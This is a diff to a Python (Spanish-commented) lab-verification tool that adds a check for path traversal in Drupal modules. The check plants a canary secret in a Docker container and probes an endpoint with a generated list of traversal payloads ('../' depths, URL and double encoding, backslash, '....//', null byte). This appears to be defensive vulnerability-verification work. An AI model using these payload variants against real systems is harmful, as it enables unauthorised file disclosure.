@@ -34,7 +34,7 @@ from dataclasses import dataclass
 from typing import Callable, List, Optional
 
 from .wpverify import (WpVerifyResult, _docker_daemon_ok, _lab_host, _pick_param, _token,
-                       _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS)
+                       _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS, _PATH_HINTS)
 
 _MYSQL_IMAGE = "mysql:5.7"
 _DRUPAL_DRUSH_IMAGE = "binoracle-drupal-drush:10"
@@ -406,6 +406,114 @@ def verify_drupal_account_takeover(
             res.detail = ("se envio la peticion pero el efecto no se confirmo -- el account "
                           "takeover no se confirmo (puede que el endpoint/parametro no sean los "
                           "reales, o que el controlador si compruebe el uid contra la sesion)")
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red)...")
+        lab.teardown()
+
+
+def verify_drupal_path_traversal(
+    module_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, path_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Segunda clase de Drupal ("poco a poco"): equivalente a verify_wordpress_path_traversal
+    (mismo patron de fichero canario con secreto aleatorio). Planta un secreto en una ruta REAL
+    del sistema de ficheros del contenedor (fuera de web/, via write_canary -- docker exec
+    directo, no toca el modulo ni la base de datos), y confirma que el endpoint lo filtra literal
+    al pedirlo con varias profundidades/codificaciones de '../' -- no una deduccion por status
+    code. Mismo catalogo de variantes que la version de WordPress (URL-encoded, doble-encoded,
+    backslash, bypass '....//' , null-byte), porque el sistema de ficheros subyacente (Linux) es
+    el mismo; lo unico que cambia es que el usuario que ataca es un usuario Drupal autenticado de
+    bajo privilegio en vez de un subscriber de WordPress."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(module_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
+    if not path_param:
+        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
+        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
+                               "lleva la ruta/nombre de fichero; afina 'parameters' en la "
+                               "hipotesis del LLM o pasalo a mano (path_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        secret = secrets.token_hex(16)
+        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
+        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
+             f"propio contenedor, fuera del docroot)...")
+        if not lab.write_canary(canary_path, secret):
+            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
+            return res
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "path_param": path_param, "canary_path": canary_path, "canary_secret": secret,
+            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
+        })
+
+        m = (http_method or "GET").upper()
+        rel = canary_path.lstrip("/")
+        depths = (2, 4, 6, 8, 10, 12)
+        attempts = [rel, canary_path]
+        attempts += [("../" * n) + rel for n in depths]
+        attempts += [("..%2f" * n) + rel for n in depths]
+        attempts += [("%2e%2e%2f" * n) + rel for n in depths]
+        attempts += [("%252e%252e%252f" * n) + rel for n in depths]
+        attempts += [("..\\" * n) + rel for n in depths]
+        attempts += [("....//" * n) + rel for n in depths]
+        attempts += [rel + "%00", canary_path + "%00"]
+
+        found = False
+        tried = []
+        for payload_value in attempts:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[path_param] = payload_value
+            step(f"probando {m} {endpoint} con {path_param}={payload_value!r}...")
+            try:
+                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                   data=payload if m != "GET" else None,
+                                   params=payload if m == "GET" else None, timeout=20)
+            except Exception as e:
+                tried.append({"payload": payload_value, "error": str(e)})
+                continue
+            tried.append({"payload": payload_value, "status": resp.status_code,
+                          "secret_presente": secret in (resp.text or "")})
+            if secret in (resp.text or ""):
+                found = True
+                res.evidence["payload_ganador"] = payload_value
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
+                     f"{path_param}={payload_value!r}.")
+                break
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
+                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
+                          f"plantado en {canary_path} (fuera del docroot)")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de ruta/codificacion para "
+                          f"{path_param} y ninguna devolvio el secreto plantado -- el traversal "
+                          f"no se confirmo (puede necesitar otra profundidad de '../', otra "
+                          f"codificacion, o el endpoint/parametro no son los reales)")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
